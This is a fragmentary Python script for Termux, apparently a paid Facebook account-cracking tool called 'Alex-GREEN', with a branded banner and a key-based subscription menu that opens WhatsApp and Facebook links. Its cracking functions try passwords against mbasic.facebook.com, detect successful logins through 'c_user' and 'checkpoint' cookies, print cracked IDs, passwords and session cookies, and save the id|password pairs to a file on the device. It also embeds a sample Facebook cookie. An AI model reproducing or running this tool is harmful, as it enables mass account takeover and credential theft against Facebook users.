...
{warna}---------------------------------------------------{P}
 Author    {M}:\033[1;37m BAYEZID 
 Github    {M}:\033[1;37m Bayezid-400 
 Facebook  {M}:\033[1;37m Bayezid 
 Tool Name {M}:\033[1;37m Alex-GREEN
 Future    {M}:\033[1;37m {H}F{P}|{H}R{P}|{H}N{P}|{H}G{P}
 Status    {M}:\033[1;32m Premium{P}
 Version   {M}: {GREEN}1.0.0\033[1;37m
{warna}---------------------------------------------------{P}""")
led = f"""{warna}---------------------------------------------------"""
#---------------------[LOOP MENU]---------------------#
...
def Subscraption():
    ...
    if key1 in r1:
        ...
        if opt =='1':
            tks = '*ASALAMUALIKUM*%2C%20*BAYEZID-SIR*%20*I*%20*WANT*%20*TO*%20*BUY*%20*YOUR*%20*NEW*%20*---*%20*MR_CRAZY_COMMAND%20*---*%20*Version%20:%201.0.2%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*='+key1
            os.system('xdg-open  https://wa.me/+8801326226582?text='+tks)
            Subscraption()
        if opt =='2':
            os.system('xdg-open https://www.facebook.com/profile.php?id=100090553850163/');Subscraption()
        if opt =='3':
            os.system('xdg-open https://www.facebook.com/profile.php?id=100090553850163/');Subscraption()
        if opt =='4':
            clear();banner2();jalan(f'{P}[{M}√{P}] Hi Bro Your BAYEZID Terminal Closed {P} ')
        else:
            print('\n\033[1;92mChoose valid option\033[0;97m');Subscraption()
myid=uuid.uuid4().hex[:100].upper()
try:
    key2 = open('/data/data/com.termux/files/usr/bin/.IDFC_hphpo-cov', 'r').read()
except:
    kok=open('/data/data/com.termux/files/usr/bin/.IDFC_hphpo-cov', 'w')
    kok.write(myid)
    kok.close()
def Subscraption1():
    ...
    if key2 in r1:
        ...
        if opt =='1':
            ...
            Subscraption()
        if opt =='2':
            os.system('xdg-open https://github.com/Bayezid-400');Subscraption()
        if opt =='3':
            os.system('xdg-open https://www.facebook.com/profile.php?id=100090553850163');Subscraption()
        if opt =='4':
...
if 'START' in ck:
    ...
    exit(f'{K}Updating Craz Green Fire');os.system("xdg-open https://github.com/Bayezid-400");os.system("xdg-open https://www.facebook.com/profile.php?id=100090553850163")
elif 'BYS' in ck:
...
banner2();jalan(f'{H}Update Checking Please Wait ') #;os.system("xdg-open https://github.com/Bayezid-400");os.system("xdg-open https://www.facebook.com/profile.php?id=100090553850163")
...
def passwrd2():
    ...
    print(f'{N} Hi Dear User Crack process has been completed')
    print(f' {P}Total ok : {H}'+str(len(ok)))
    print(f' {P}Total ok : {K}'+str(len(ok)))
    print(led)
    input('Press Enter To Go Menu')
    menu()
def pwb():
...
def filexxxx(idf,pwv):
   ...
   'authority': 'mbasic.facebook.com',
    ...
    # 'cookie': 'datr=ZZ1lZbf1q26mS3fOA9mbrbc4; sb=ZZ1lZfnrT3OhtqcGXkqlDxxj; m_pixel_ratio=1.6187498569488525; wd=445x901; fr=0VcecT1koLpaQrflf..BlZZ1l.po.AAA.0.0.BlfWsg.AWVL117qsY0',
    'dpr': '2',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                ok.append(uid)
                print('\x1b[1;92m[IDFC-OK] '+uid+'|'+ps+'\33[0;97m '+Jawnx(uid)+' ');print('\x1b[1;92m[COOKIE-:] '+coki)
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print(f'{A}[IDFC-Ok] '+uid+'|'+ps+' \33[0;97m'+Jawnx(uid)+' ')
                open('/sdcard/IDFC-OK.txt', 'a').write(uid+' | '+ps+'\n')
                cp.append(uid)
                break
            else:
...
"accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\x1b[1;93m[IDFC-OK]  '+idf+'|'+pw+'\033[0;97m     ')
                open('/sdcard/IDFC-OK.txt', 'a').write(idf+'|'+pw+'|'+ua+'\n')
                cp+=1
                break
                ...
                print(f'\x1b[1;92m[IDFC-OK] '+idf+'|'+pw+'\033[0;97m     ')
                print(f'\r    {P}[{H}√{P}] COOKIES   : {B}%s{P}'%(kuki))
                open('/sdcard/IDFC-OK.txt', 'a').write(idf+'|'+pw+'\n')
